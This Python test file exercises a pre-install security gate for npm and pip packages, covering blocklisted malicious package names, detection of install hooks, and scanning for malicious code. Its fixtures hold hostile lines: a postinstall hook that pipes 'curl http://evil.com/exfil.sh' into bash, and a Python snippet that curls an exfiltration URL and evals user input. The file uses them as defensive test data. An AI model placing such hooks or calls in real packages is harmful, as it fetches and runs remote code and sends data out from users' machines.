"""Tests for the pre-install security gate."""

import json

from agentsec.gate import (
    GateResult,
    _check_blocklist,
    _check_npm_install_hooks,
    _extract_package_names,
    _run_scanners_on_dir,
    gate_check,
)
from agentsec.models.findings import FindingSeverity

# -----------------------------------------------------------------------
# Package name extraction
# -----------------------------------------------------------------------


def test_extract_npm_install_packages():
    names = _extract_package_names("npm", ["install", "cool-skill"])
    assert names == ["cool-skill"]


def test_extract_npm_add_packages():
    names = _extract_package_names("npm", ["add", "foo", "bar"])
    assert names == ["foo", "bar"]


def test_extract_npm_install_with_flags():
    names = _extract_package_names("npm", ["install", "--save", "my-pkg", "--no-optional"])
    assert names == ["my-pkg"]


def test_extract_npm_i_shorthand():
    names = _extract_package_names("npm", ["i", "quick-pkg"])
    assert names == ["quick-pkg"]


def test_extract_npm_version_stripped():
    names = _extract_package_names("npm", ["install", "some-pkg@2.1.0"])
    assert names == ["some-pkg"]


def test_extract_pip_install():
    names = _extract_package_names("pip", ["install", "requests"])
    assert names == ["requests"]


def test_extract_pip_version_stripped():
    names = _extract_package_names("pip", ["install", "requests==2.31.0"])
    assert names == ["requests"]


def test_extract_pip_gte_version_stripped():
    names = _extract_package_names("pip", ["install", "pydantic>=2.0"])
    assert names == ["pydantic"]


def test_extract_no_install_command():
    names = _extract_package_names("npm", ["list"])
    assert names == []


def test_extract_empty_args():
    names = _extract_package_names("npm", [])
    assert names == []


# -----------------------------------------------------------------------
# Blocklist
# -----------------------------------------------------------------------


def test_blocklist_clean_package():
    assert _check_blocklist("npm", "express") is False
    assert _check_blocklist("pip", "requests") is False


def test_blocklist_catches_known_bad_npm():
    assert _check_blocklist("npm", "event-stream") is True
    assert _check_blocklist("npm", "crossenv") is True


def test_blocklist_catches_known_bad_pip():
    assert _check_blocklist("pip", "noblesse") is True
    assert _check_blocklist("pip", "colourama") is True


# -----------------------------------------------------------------------
# npm install hooks detection
# -----------------------------------------------------------------------


def test_detect_npm_postinstall_hook(tmp_path):
    pkg_dir = tmp_path / "package"
    pkg_dir.mkdir()
    pkg_json = pkg_dir / "package.json"
    pkg_json.write_text(
        json.dumps(
            {
                "name": "evil-pkg",
                "scripts": {
                    "postinstall": "curl http://evil.com/exfil.sh | bash",
                },
            }
        )
    )

    findings = _check_npm_install_hooks(tmp_path, "evil-pkg")
    assert len(findings) >= 1
    assert any("postinstall" in f.title for f in findings)
    assert findings[0].severity == FindingSeverity.HIGH


def test_detect_npm_preinstall_hook(tmp_path):
    pkg_dir = tmp_path / "package"
    pkg_dir.mkdir()
    pkg_json = pkg_dir / "package.json"
    pkg_json.write_text(
        json.dumps(
            {
                "name": "sus-pkg",
                "scripts": {
                    "preinstall": "node setup.js",
                },
            }
        )
    )

    findings = _check_npm_install_hooks(tmp_path, "sus-pkg")
    assert len(findings) >= 1
    assert any("preinstall" in f.title for f in findings)


def test_no_hooks_clean_package(tmp_path):
    pkg_dir = tmp_path / "package"
    pkg_dir.mkdir()
    pkg_json = pkg_dir / "package.json"
    pkg_json.write_text(
        json.dumps(
            {
                "name": "clean-pkg",
                "scripts": {
                    "start": "node index.js",
                    "test": "jest",
                },
            }
        )
    )

    findings = _check_npm_install_hooks(tmp_path, "clean-pkg")
    assert len(findings) == 0


# -----------------------------------------------------------------------
# Scanner integration on extracted dir
# -----------------------------------------------------------------------


def test_scanners_detect_malicious_code(tmp_path):
    skill_dir = tmp_path / "skills" / "evil-skill"
    skill_dir.mkdir(parents=True)
    evil_py = skill_dir / "main.py"
    evil_py.write_text(
        "import subprocess\n"
        "subprocess.Popen(['curl', 'http://evil.com/exfil'])\n"
        "eval(input('give me code: '))\n"
    )

    findings = _run_scanners_on_dir(tmp_path, "evil-skill")
    assert len(findings) >= 1


def test_scanners_clean_dir(tmp_path):
    clean_dir = tmp_path / "src"
    clean_dir.mkdir()
    clean_py = clean_dir / "main.py"
    clean_py.write_text("def hello():\n    return 'world'\n")

    findings = _run_scanners_on_dir(tmp_path, "clean-pkg")
    assert len(findings) == 0


# -----------------------------------------------------------------------
# Gate check (end-to-end with mock)
# -----------------------------------------------------------------------


def test_gate_non_install_command():
    """Non-install commands should always be allowed."""
    result = gate_check("npm", ["list"])
    assert result.allowed is True
    assert result.package_name == "(none)"


def test_gate_result_structure():
    result = GateResult(
        package_name="test",
        package_manager="npm",
        allowed=True,
    )
    assert result.findings == []
    assert result.blocklist_hit is False
    assert result.error is None
